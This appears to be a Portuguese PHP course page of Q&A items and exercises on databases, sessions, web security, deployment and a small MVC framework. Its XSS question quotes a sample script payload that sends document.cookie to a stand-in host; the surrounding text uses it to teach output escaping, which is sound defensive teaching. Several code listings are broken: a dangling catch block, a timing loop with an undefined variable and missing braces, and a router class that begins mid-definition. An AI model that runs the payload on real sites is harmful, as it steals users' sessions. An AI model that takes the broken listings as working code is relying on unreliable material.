  • **RETURNING**: INSERT INTO pedidos (...) VALUES (...) RETURNING id, criado_em devolve as colunas geradas no mesmo comando, sem um SELECT a mais. Útil ao criar o pedido e já mostrar o número dele.
  • JSONB com índices GIN: guardar atributos variáveis de produtos (dimensões de um livro, faixas de um disco) num campo jsonb e consultar WHERE atributos @> '{"capa": "dura"}' com índice.
  • Busca textual nativa (tsvector, to_tsquery('portuguese', ...)): busca por radicais ("livros" encontra "livro") e com ranking, sem um serviço externo.

Outros: tipos de array, CTEs recursivas (árvore de categorias), índices parciais (WHERE ativo), DDL transacional (visto nas migrations) e ON CONFLICT com mais opções que o ON DUPLICATE KEY UPDATE.

Q46

Quando o SQLite basta

O SQLite é "só para testes"? Em que situações ele é a escolha certa em produção, e qual é a principal limitação dele?

Não. O SQLite é um banco embutido: uma biblioteca que lê e grava um arquivo, sem servidor. É a escolha certa para aplicações de um servidor só com volume de escrita moderado (sites de conteúdo, painéis internos, blogs), aplicativos de desktop e celular, ferramentas de linha de comando e caches locais. É rápido (sem ida à rede), não exige administração e o backup é copiar um arquivo (com cuidado, via .backup ou VACUUM INTO). A limitação principal são as escritas concorrentes: há uma única escrita por vez no banco inteiro. Com o modo WAL (PRAGMA journal_mode=WAL), leituras e uma escrita convivem bem, mas muitos processos escrevendo ao mesmo tempo, ou vários servidores acessando o mesmo arquivo pela rede, pedem um banco servidor.

SQLite com transação e UPSERT

Com o SQLite, crie a tabela estoque(livro_id PRIMARY KEY, qtd) e escreva function darBaixa(PDO $pdo, array $itens): void, que baixa o estoque de vários livros numa transação, recusando a operação inteira se algum ficar negativo. Use um UPSERT (INSERT ... ON CONFLICT DO UPDATE) para a entrada de estoque. Mostre uma baixa que dá certo e uma que é desfeita.

<?php
declare(strict_types=1);

$pdo = new PDO('sqlite::memory:', options: [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
$pdo->exec("CREATE TABLE estoque (livro_id INTEGER PRIMARY KEY, qtd INTEGER NOT NULL CHECK (qtd >= 0))");

function entrada(PDO $pdo, int $livro, int $qtd): void
{
    $pdo->prepare("INSERT INTO estoque (livro_id, qtd) VALUES (:l, :q)
                   ON CONFLICT (livro_id) DO UPDATE SET qtd = qtd + excluded.qtd")
        ->execute(['l' => $livro, 'q' => $qtd]);
}

function darBaixa(PDO $pdo, array $itens): void
{
    $pdo->beginTransaction();
    try {
        $st = $pdo->prepare("UPDATE estoque SET qtd = qtd - ? WHERE livro_id = ?");
        foreach ($itens as $livro => $qtd) {
            $st->execute([$qtd, $livro]);  // o CHECK recusa estoque negativo
        }
        $pdo->commit();
    } catch (PDOException $e) {
        $pdo->rollBack();
        throw new DomainException("estoque insuficiente; nada foi baixado", previous: $e);
    }
}

function mostrar(PDO $pdo): string
{
    return implode(', ', array_map(fn($r) => "livro {$r[0]}: {$r[1]}", $pdo->query("SELECT * FROM estoque ORDER BY livro_id")->fetchAll(PDO::FETCH_NUM)));
}

} catch (DomainException $e) {

}

Q50

GET ou POST

Quando um formulário deve usar GET e quando POST? Por que o formulário de busca do site usa GET, e o de login não pode usar?

GET é para consultar: os dados vão na URL, a requisição pode ser repetida, guardada nos favoritos, compartilhada e posta em cache, e não deve alterar nada no servidor. POST é para alterar (criar, enviar, apagar): os dados vão no corpo, e o navegador avisa antes de reenviar. A busca usa GET porque o resultado de /busca?q=machado pode ser compartilhado e indexado. O login não pode usar GET porque a senha ficaria na URL, e URLs aparecem no histórico do navegador, nos logs do servidor e dos proxies e no cabeçalho Referer enviado a outros sites. O POST não criptografa nada: a proteção real é o HTTPS.

Q51

Sessão e cookie

Qual a diferença entre guardar o carrinho num cookie e na sessão ($_SESSION)? Que atributos um cookie de sessão deve ter, e por que chamar session_regenerate_id(true) no login?

O cookie fica no navegador: o usuário pode ler e alterar o conteúdo, e ele viaja em toda requisição (com limite de uns 4 KB). A sessão fica no servidor; o navegador guarda só um identificador aleatório (o cookie PHPSESSID). Um carrinho com preços num cookie pode ser adulterado; na sessão, não. O cookie de sessão deve ter HttpOnly (o JavaScript não o lê, o que limita o roubo por XSS), Secure (só via HTTPS) e SameSite=Lax ou Strict (não vai em requisições iniciadas por outros sites, o que reduz o CSRF). O session_regenerate_id(true) no login troca o identificador e descarta o antigo, contra a fixação de sessão: o atacante não consegue "plantar" um id conhecido antes do login e aproveitá-lo depois.

Q52

XSS: escapar na saída

Um comentário com <script>fetch('https://mal.com?c='+document.cookie)</script> foi gravado no banco. Onde e como o PHP deve impedir que ele execute? Por que filtrar na entrada não basta?

Na saída: todo dado exibido no HTML passa por htmlspecialchars($texto, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'), que transforma < em &lt;, e o navegador mostra o texto em vez de executá-lo. Os templates modernos (Blade, Twig, Plates com $this->e()) fazem isso por padrão. Filtrar na entrada não basta porque o mesmo dado vai para lugares diferentes (HTML, atributo, JavaScript, URL, JSON), cada um com regras próprias de escape, e porque dados entram por caminhos que o filtro não vê (importações, APIs, o próprio banco). Como camada extra, um cabeçalho Content-Security-Policy que proíba scripts inline impede a execução mesmo quando um escape é esquecido.

Q53

PSR-12 e as outras PSRs

O que é uma PSR, e qual a diferença de natureza entre a PSR-12 (estilo de código), a PSR-4 (autoload) e a PSR-7 (mensagens HTTP)?

PSRs (PHP Standards Recommendations) são padrões publicados pelo PHP-FIG, um grupo de projetos que combinam convenções para que bibliotecas diferentes funcionem juntas. Elas são de naturezas diferentes: a PSR-12 (hoje sucedida pelo PER Coding Style) é só estilo: indentação, chaves, espaços, de modo que todo código PHP pareça do mesmo autor, e é aplicada por ferramentas como o PHP-CS-Fixer; a PSR-4 é uma convenção de nomes, que liga namespace a pasta e permite um autoload universal; a PSR-7 define interfaces (RequestInterface, ResponseInterface) que permitem trocar a biblioteca HTTP ou escrever um middleware (PSR-15) que funciona em qualquer framework compatível. Outras PSRs muito usadas: PSR-3 (log), PSR-11 (contêiner) e PSR-20 (relógio).

Q58

Mass assignment

O que é mass assignment no Eloquent, e por que Livro::create($request->all()) é perigoso sem $fillable? Qual a forma recomendada?

É criar ou atualizar um modelo a partir de um array inteiro de uma vez. Com $request->all(), qualquer campo enviado pelo cliente vai para o modelo: se a tabela users tem a coluna is_admin, um formulário de cadastro com um campo extra is_admin=1 cria um administrador. O Eloquent protege por padrão: só aceita em massa os atributos listados em $fillable (ou não listados em $guarded), e lança exceção ou ignora os outros. A forma recomendada é usar só os dados validados: Livro::create($request->validated()), com as regras num Form Request. Assim, o que não tem regra de validação nem chega ao modelo. É o mesmo overposting do caderno de C#.

Q59

Policies

O editor pode alterar qualquer livro; o autor, só os próprios. Onde essa regra deve morar no Laravel, e por que não no controller?

Numa Policy (LivroPolicy), com um método por ação: update(User $user, Livro $livro): bool devolve $user->role === 'editor' || $livro->autor_id === $user->id. O controller só pergunta ($this->authorize('update', $livro) ou Gate::authorize), e o Blade usa a mesma regra para mostrar ou esconder o botão (@can('update', $livro)). Com a regra no controller, ela seria repetida no controller da API, na listagem que decide quais botões mostrar e no comando de terminal, e uma das cópias acabaria diferente. Centralizada, é testável sozinha e muda num lugar só. É também um dos itens pendentes deste próprio site: "author edita apenas os próprios artigos".

Q62

Senhas

Como guardar senhas em PHP? Por que md5($senha) e sha256 com salt não servem, e o que password_needs_rehash resolve?

Com password_hash($senha, PASSWORD_DEFAULT) e conferindo com password_verify($senha, $hash). O md5 e o SHA-256 são funções de hash rápidas, feitas para verificar arquivos: uma placa de vídeo testa bilhões delas por segundo, e uma senha comum vazada cai em minutos, com ou sem salt. O password_hash usa algoritmos lentos de propósito e configuráveis (bcrypt por padrão; Argon2id com PASSWORD_ARGON2ID), gera o salt sozinho e guarda algoritmo, custo e salt dentro da própria string. O password_needs_rehash informa, no momento do login (quando a senha em texto está disponível), que o hash guardado usa um algoritmo ou um custo antigo: o sistema gera um novo e atualiza o banco, migrando os usuários aos poucos, sem forçar ninguém a trocar a senha.

Q63

Cabeçalhos de segurança

Cite quatro cabeçalhos HTTP de segurança que um site PHP deve enviar, e o que cada um impede.

  • **Content-Security-Policy*: define de onde podem vir *scripts, estilos e imagens; bloqueia scripts injetados por XSS (script-src 'self' proíbe scripts inline e de outros domínios).
  • **Strict-Transport-Security** (HSTS): obriga o navegador a usar HTTPS no domínio por um período, impedindo o rebaixamento para HTTP numa rede hostil.
  • **X-Content-Type-Options: nosniff*: impede o navegador de "adivinhar" o tipo de um arquivo, e com isso de executar como *script um upload que se diz imagem.
  • **X-Frame-Options: DENY** (ou frame-ancestors no CSP): impede que o site seja carregado num <iframe> de outro domínio, a base do clickjacking.

Também vale o Referrer-Policy: strict-origin-when-cross-origin, para não vazar URLs com dados para outros sites.

Q64

OPcache e o preload

O que o OPcache faz, e por que, em produção, opcache.validate_timestamps=0 dá desempenho mas exige cuidado no deploy?

Sem OPcache, o PHP lê e compila cada arquivo em todas as requisições. O OPcache guarda o resultado da compilação (os opcodes) na memória compartilhada, e as requisições seguintes pulam a leitura e a compilação: costuma ser o maior ganho de desempenho de uma aplicação PHP, sem mudar uma linha. Com validate_timestamps=1, ele ainda confere a data de cada arquivo de tempos em tempos para saber se mudou. Com 0, nunca confere: é mais rápido, mas um deploy que só copia arquivos novos continua executando a versão antiga guardada na memória. O deploy precisa então recarregar o PHP-FPM (systemctl reload php8.5-fpm) ou limpar o cache. O preload (opcache.preload) vai além e carrega classes do framework uma vez, na partida do servidor.

Q65

Deploy sem tempo fora do ar

Descreva um deploy de uma aplicação PHP que não deixa o site fora do ar nem pela metade (código novo com dependências velhas). O que é a troca atômica de symlink?

Cada versão vai para uma pasta própria (releases/2026-10-20-1430/). Nela, o deploy baixa o código da tag, roda composer install --no-dev --optimize-autoloader, liga os arquivos compartilhados (.env, storage/, uploads) por symlinks para shared/, e aplica as migrations compatíveis com a versão anterior. Só no fim, o symlink current (que é a raiz do servidor web) passa a apontar para a pasta nova, com ln -sfn seguido de mv -T, uma operação atômica: nenhuma requisição vê metade de uma versão. Depois, recarrega-se o PHP-FPM, por causa do OPcache. Voltar à versão anterior é apontar o symlink de volta. Ferramentas como o Deployer automatizam exatamente esse roteiro.

Medindo o N+1

Com SQLite em memória, crie 200 pedidos de 50 clientes e meça, com hrtime, duas formas de listar os pedidos com o nome do cliente: uma consulta para os pedidos e uma por pedido para o cliente (N+1), e uma consulta com JOIN. Mostre o número de consultas de cada forma e qual foi mais rápida.

<?php
declare(strict_types=1);

$pdo = new PDO('sqlite::memory:', options: [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
$pdo->exec("CREATE TABLE clientes (id INTEGER PRIMARY KEY, nome TEXT);
            CREATE TABLE pedidos (id INTEGER PRIMARY KEY, cliente_id INTEGER, total INTEGER)");
$pdo->beginTransaction();
for ($c = 1; $c <= 50; $c++) {
    $pdo->exec("INSERT INTO clientes VALUES ($c, 'Cliente $c')");
}
for ($p = 1; $p <= 200; $p++) {
    $pdo->exec("INSERT INTO pedidos VALUES ($p, " . (($p % 50) + 1) . ", " . ($p * 100) . ")");
}
$pdo->commit();

function nMaisUm(PDO $pdo): array
{
    $consultas = 1;
    $linhas = [];
    $cli = $pdo->prepare("SELECT nome FROM clientes WHERE id = ?");
    foreach ($pdo->query("SELECT id, cliente_id FROM pedidos") as $ped) {
        $cli->execute([$ped['cliente_id']]);
        $consultas++;
        $linhas[] = [$ped['id'], $cli->fetchColumn()];
    }
    return [$linhas, $consultas];
}

function comJoin(PDO $pdo): array
{
    $linhas = $pdo->query("SELECT p.id, c.nome FROM pedidos p JOIN clientes c ON c.id = p.cliente_id ORDER BY p.id")
        ->fetchAll(PDO::FETCH_NUM);
    return [$linhas, 1];
}

foreach (['N+1' => 'nMaisUm', 'JOIN' => 'comJoin'] as $nome => $f) {
    $melhor = PHP_INT_MAX;
    for ($i = 0; $i < 20; $i++) {  // repete e fica com o melhor tempo, para reduzir o ruído

        [$linhas, $consultas] = $f($pdo);
        $melhor = min($melhor, hrtime(true) - $t);

    $tempos[$nome] = $melhor;
    echo "$nome: ", count($linhas), " linhas em $consultas consulta(s)\n";
}

Os tempos exatos mudam de máquina para máquina, por isso a saída só compara. E aqui o banco está na memória do próprio processo: cada consulta custa microssegundos. Com MySQL ou PostgreSQL num servidor, cada consulta paga também uma ida e volta pela rede (de 0,1 a 1 ms numa rede local), e as 201 consultas do N+1 viram dezenas ou centenas de milissegundos por página. O hrtime(true) devolve nanossegundos de um relógio monotônico, que não volta para trás quando o relógio do sistema é ajustado, ao contrário do microtime.

    public function post(string $padrao, Closure $acao): void { $this->rotas[] = ['POST', $padrao, $acao]; }

    public function despachar(string $metodo, string $caminho): string
    {
        $permitidos = [];
        foreach ($this->rotas as [$m, $padrao, $acao]) {
            $regex = '#^' . preg_replace('#\{(\w+)\}#', '(?P<$1>[^/]+)', $padrao) . '$#';
            if (!preg_match($regex, $caminho, $achou)) {
                continue;
            }
            if ($m !== $metodo) {
                $permitidos[] = $m;
                continue;
            }
            $params = array_filter($achou, 'is_string', ARRAY_FILTER_USE_KEY);  // só os grupos nomeados
            return $acao(...$params);  // array com chaves de texto vira argumentos nomeados
        }
        return $permitidos ? "405 (permitidos: " . implode(', ', array_unique($permitidos)) . ")" : '404';
    }
}

D1

Uma calculadora, duas interfaces

Escreva uma calculadora com sete operações: soma, subtração, multiplicação, divisão, potência (expoente inteiro), porcentagem (15 % 200 é 15% de 200) e raiz quadrada (raiz 2). Ela deve: (a) aceitar vírgula ou ponto como separador decimal; (b) guardar o último resultado em ans, utilizável na conta seguinte; (c) recusar divisão por zero, raiz de negativo, expoente fracionário e texto que não é número com uma mensagem clara, sem encerrar o programa; (d) ter os comandos hist (histórico) e sair no terminal. O mesmo núcleo (Calculadora.php) deve servir a duas interfaces: um programa de terminal (cli.php) e uma página web (web.php), que guarda o ans e o histórico na sessão. Use a extensão bcmath para que 0,1 + 0,2 dê exatamente 0,3.

Caminho da solução

  • Núcleo: a classe Calculadora recebe a linha e devolve o resultado como string decimal (o formato do bcmath), ou lança CalculadoraException com a mensagem para o usuário. Ela não faz echo nem lê nada: é usada igualmente pelo terminal, pela página e por testes.
  • Números: com o bcmath, os números são strings com uma escala fixa (aqui, 10 casas), e as contas são exatas em decimal. A raiz usa bcsqrt, também com 10 casas. Os zeros à direita são removidos só na exibição.
  • Terminal: lê com fgets(STDIN), mantém o histórico num array.
  • Web: um formulário POST com o campo da conta, token CSRF e PRG, como no módulo 7; o ans e o histórico ficam em $_SESSION, e cada valor exibido passa por htmlspecialchars.

Calculadora.php:

<?php
declare(strict_types=1);

final class CalculadoraException extends RuntimeException {}

final class Calculadora
{
    private const ESCALA = 10;

    public function __construct(public private(set) string $ans = '0') {}

    /** Avalia "12,5 + 3", "2 ^ 10", "15 % 200" ou "raiz 2" e devolve o resultado como string decimal. */
    public function avaliar(string $linha): string
    {
        $p = preg_split('/\s+/', trim($linha), flags: PREG_SPLIT_NO_EMPTY);
        $r = match (true) {
            count($p) === 2 && $p[0] === 'raiz' => $this->raiz($this->numero($p[1])),
            count($p) === 3 => $this->operar($p[1], $this->numero($p[0]), $this->numero($p[2])),
            default => throw new CalculadoraException('use "a op b" ou "raiz a"'),
        };
        return $this->ans = $r;  // só chega aqui se não houve erro
    }

    private function numero(string $texto): string
    {
        if ($texto === 'ans') {
            return $this->ans;
        }
        $t = str_replace(',', '.', $texto);
        if (!preg_match('/^-?\d+(\.\d+)?$/', $t)) {
            throw new CalculadoraException("\"$texto\" não é um número");
        }
        return $t;
    }

    private function raiz(string $x): string
    {
        if (bccomp($x, '0', self::ESCALA) < 0) {
            throw new CalculadoraException('raiz de número negativo');
        }
        return bcsqrt($x, self::ESCALA);
    }

    private function operar(string $op, string $a, string $b): string
    {
        return match ($op) {
            '+' => bcadd($a, $b, self::ESCALA),
            '-' => bcsub($a, $b, self::ESCALA),
            '*' => bcmul($a, $b, self::ESCALA),
            '/' => bccomp($b, '0', self::ESCALA) === 0
                ? throw new CalculadoraException('divisão por zero')
                : bcdiv($a, $b, self::ESCALA),
            '%' => bcdiv(bcmul($a, $b, self::ESCALA), '100', self::ESCALA),
            '^' => $this->potencia($a, $b),
            default => throw new CalculadoraException("operação desconhecida \"$op\" (use + - * / ^ % ou raiz)"),
        };
    }

    private function potencia(string $a, string $b): string
    {
        if (!preg_match('/^-?\d+(\.0+)?$/', $b)) {
            throw new CalculadoraException('o expoente precisa ser inteiro');
        }
        if (abs((int) $b) > 1000) {
            throw new CalculadoraException('expoente grande demais');
        }
        return bcpow($a, (string) (int) $b, self::ESCALA);
    }

    /** Para exibir: vírgula decimal e sem zeros à direita. */
    public static function formatar(string $valor): string
    {
        if (str_contains($valor, '.')) {
            $valor = rtrim(rtrim($valor, '0'), '.');
        }
        return str_replace('.', ',', $valor === '-0' ? '0' : $valor);
    }
}

Um mini-framework MVC

Construa o esqueleto de um framework MVC como o deste site: um front controller (public/index.php), um roteador com parâmetros (o do módulo 10), um contêiner de injeção de dependências simples, controllers que recebem um objeto Request e devolvem um Response, views com escape automático, um middleware de CSRF e um repositório com PDO. Escreva uma página de listagem e uma de cadastro de livros, com testes de integração que façam requisições ao front controller sem servidor.

Caminho da solução

  • Front controller: o servidor web manda toda requisição para public/index.php (no Apache, com RewriteRule ^ index.php [L] no .htaccess da pasta public/; no nginx, try_files $uri /index.php?$query_string). Ele carrega o autoload do Composer, monta o contêiner, cria o Request a partir das superglobais, despacha e envia o Response. Só a pasta public/ fica exposta: código, .env e vendor/ ficam um nível acima.
  • Request e Response: objetos imutáveis (métodos with..., como na PSR-7) em vez de acessar $_POST e chamar header() espalhados; isso é o que permite testar sem servidor: o teste cria um Request, chama a aplicação e inspeciona o Response, sem echo nem cabeçalhos enviados.
  • Contêiner: um array de closures ($c->set(PDO::class, fn() => new PDO(...))), com instância única criada sob demanda (lazy). É o que faz o bootstrap/app.php deste site.
  • Middlewares: uma pilha de funções fn(Request $r, Closure $proximo): Response; o de CSRF confere o token em todo POST, e o de autenticação redireciona para o login.
  • Views: um View::render('livros/lista', ['livros' => $livros]) que extrai as variáveis e inclui o template; a função e() escapa, e o layout é aplicado em volta. O League Plates, usado neste site, é uma versão madura dessa ideia.
  • Erros: um set_exception_handler que grava no log e mostra uma página 500 genérica em produção (e o detalhe só com APP_DEBUG=true).
  • Testes: com o PHPUnit, um Request de GET /livros deve devolver 200 com os títulos; um POST /livros sem token deve devolver 403; e um com dados válidos, 303 para a página do livro, com o registro no banco (SQLite em memória).

Comparar o resultado com o Laravel do módulo 8 mostra o que um framework completo acrescenta (filas, ORM, autenticação pronta) e confirma que não há mágica: são as mesmas peças, mais bem acabadas.
